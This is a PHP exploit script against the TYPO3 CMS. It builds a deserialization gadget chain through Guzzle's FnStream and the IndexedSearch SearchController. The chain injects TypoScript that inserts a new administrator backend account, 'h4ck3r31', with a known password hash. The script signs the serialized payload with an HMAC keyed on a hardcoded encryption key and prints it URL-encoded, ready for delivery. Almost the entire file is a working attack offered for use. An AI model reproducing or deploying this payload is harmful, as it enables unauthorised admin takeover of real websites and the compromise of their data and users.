<?php
namespace GuzzleHttp\Psr7
{
    class FnStream
    {
        public $_fn_close;
        function __construct($f)
        {
            $this->_fn_close = $f;
        }
    }
}

namespace TYPO3\CMS\Core\TypoScript
{
    class TypoScriptService {}
}

namespace TYPO3\CMS\IndexedSearch\Controller
{
    class SearchController
    {
        protected $typoScriptService;
        protected $settings = [
            'results' => [
                /**
                 * @see TypoScriptService::convertPlainArrayToTypoScriptArray
                 */
                'summaryCropSignifier' => [
                    '_typoScriptNodeValue' => '',
                ]
            ]
        ];

        public function initialize($searchData = []) {}
        public function __construct(array $payload)
        {
            $this->typoScriptService = new \TYPO3\CMS\Core\TypoScript\TypoScriptService();
            $this->settings['results']['summaryCropSignifier'] = $payload;
        }
    }
}

namespace TYPO3\CMS\Core\Utility {
    class GeneralUtility {
        // same as hash_hmac('sha1', $string, $encryptionKey);
        public static function hmac($input, $additionalSecret = '')
        {
            // $encryptionKey = $GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey'];
            $encryptionKey = 'f30230987c323b8f81a0ab9fe5b690fd0ba3fb8161f4027221a6b6aa4c50ce629049b7d30c3681f3a9e2031f1dc401e6';

            $hashAlgorithm = 'sha1';
            $hashBlocksize = 64;
            $secret = $encryptionKey . $additionalSecret;
            if (extension_loaded('hash') && function_exists('hash_hmac') && function_exists('hash_algos') && in_array($hashAlgorithm, hash_algos())) {
                $hmac = hash_hmac($hashAlgorithm, $input, $secret);
            } else {
                // Outer padding
                $opad = str_repeat(chr(92), $hashBlocksize);
                // Inner padding
                $ipad = str_repeat(chr(54), $hashBlocksize);
                if (strlen($secret) > $hashBlocksize) {
                    // Keys longer than block size are shorten
                    $key = str_pad(pack('H*', call_user_func($hashAlgorithm, $secret)), $hashBlocksize, "\0");
                } else {
                    // Keys shorter than block size are zero-padded
                    $key = str_pad($secret, $hashBlocksize, "\0");
                }
                $hmac = call_user_func($hashAlgorithm, ($key ^ $opad) . pack('H*', call_user_func(
                        $hashAlgorithm,
                        ($key ^ $ipad) . $input
                    )));
            }
            return $hmac;
        }
    }
}

namespace {
    /*
     * openssl passwd -1 -salt 123456 password
     * => $1$123456$qqQvjw0PqIk7otmzNsUIN0
     */

    /*
        cObject = TEXT
        cObject {
            value = be_users
            preUserFunc = TYPO3\CMS\Extbase\Persistence\Generic\Storage\Typo3DbBackend->addRow
            preUserFunc {
                username = h4ck3r31
                password = $1$123456$qqQvjw0PqIk7otmzNsUIN0
                admin = 1
            }
        }
     */
    $attackTypoScript = [
        'cObject' => [
            '_typoScriptNodeValue' => 'TEXT',
            'value' => 'be_users',
            'preUserFunc' => [
                '_typoScriptNodeValue' => 'TYPO3\\CMS\\Extbase\\Persistence\\Generic\\Storage\\Typo3DbBackend->addRow',
                'username' => 'h4ck3r31',
                'password' => '$1$123456$qqQvjw0PqIk7otmzNsUIN0',
                'admin' => 1
            ],
        ],
    ];

    $trigger = new \TYPO3\CMS\IndexedSearch\Controller\SearchController($attackTypoScript);
    $caller = new \GuzzleHttp\Psr7\FnStream([$trigger, 'initialize']);

    echo 'Plain "x"' . PHP_EOL;
    echo \TYPO3\CMS\Core\Utility\GeneralUtility::hmac('x') . PHP_EOL;

    echo '---' . PHP_EOL;

    echo 'Real payload (signed)' . PHP_EOL;
    $attack = serialize($caller);
    $signedAttack = $attack . \TYPO3\CMS\Core\Utility\GeneralUtility::hmac($attack);
    print_r($signedAttack  . PHP_EOL);

    echo '---' . PHP_EOL;

    echo 'Real payload (signed, encoded)' . PHP_EOL;
    print_r(rawurlencode($signedAttack) . PHP_EOL);

    echo '---' . PHP_EOL;
}
